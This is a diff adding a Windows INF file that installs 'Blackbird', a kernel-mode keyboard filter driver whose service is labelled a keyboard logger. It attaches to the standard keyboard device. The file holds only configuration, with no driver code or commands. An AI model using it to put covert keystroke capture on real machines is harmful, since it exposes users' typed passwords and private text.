@@ -1,0 +1,80 @@
+;
+; Blackbird Kernel Driver Installation File
+; Windows Keyboard Filter Driver
+;
+
+[Version]
+Signature="$WINDOWS NT$"
+Class=Keyboard
+ClassGuid={4D36E96B-E325-11CE-BFC1-08002BE10318}
+Provider=%ManufacturerName%
+DriverVer=01/27/2026,1.0.0.0
+CatalogFile=blackbird.cat
+PnpLockdown=1
+
+[DestinationDirs]
+DefaultDestDir = 12
+BlackbirdDriver_Device_CoInstaller_CopyFiles = 11
+
+[SourceDisksNames]
+1 = %DiskName%,,,""
+
+[SourceDisksFiles]
+blackbird_driver.sys = 1,,
+
+;*****************************************
+; Install Section
+;*****************************************
+
+[Manufacturer]
+%ManufacturerName%=Standard,NTamd64
+
+[Standard.NTamd64]
+%BlackbirdDriver.DeviceDesc%=BlackbirdDriver_Device, *PNP0303
+%BlackbirdDriver.DeviceDesc%=BlackbirdDriver_Device, Root\SYSTEM\0000
+
+[BlackbirdDriver_Device.NT]
+CopyFiles=Drivers_Dir
+
+[Drivers_Dir]
+blackbird_driver.sys
+
+;-------------- Service installation
+[BlackbirdDriver_Device.NT.Services]
+AddService = BlackbirdDriver,%SPSVCINST_ASSOCSERVICE%, BlackbirdDriver_Service_Inst
+
+; -------------- BlackbirdDriver driver install sections
+[BlackbirdDriver_Service_Inst]
+DisplayName    = %BlackbirdDriver.SVCDESC%
+ServiceType    = 1               ; SERVICE_KERNEL_DRIVER
+StartType      = 3               ; SERVICE_DEMAND_START 
+ErrorControl   = 1               ; SERVICE_ERROR_NORMAL
+ServiceBinary  = %12%\blackbird_driver.sys
+
+;
+;--- BlackbirdDriver_Device Coinstaller installation ------
+;
+
+[BlackbirdDriver_Device.NT.CoInstallers]
+AddReg=BlackbirdDriver_Device_CoInstaller_AddReg
+CopyFiles=BlackbirdDriver_Device_CoInstaller_CopyFiles
+
+[BlackbirdDriver_Device_CoInstaller_AddReg]
+;
+
+
+[BlackbirdDriver_Device_CoInstaller_CopyFiles]
+;
+
+
+[BlackbirdDriver_Device.NT.Wdf]
+KmdfService =  BlackbirdDriver, BlackbirdDriver_wdfsect
+[BlackbirdDriver_wdfsect]
+KmdfLibraryVersion = 1.15
+
+[Strings]
+SPSVCINST_ASSOCSERVICE= 0x00000002
+ManufacturerName="Blackbird"
+DiskName = "Blackbird Kernel Driver Installation Disk"
+BlackbirdDriver.DeviceDesc = "Blackbird Keyboard Filter Driver"
+BlackbirdDriver.SVCDESC = "Blackbird Keyboard Logger Service"
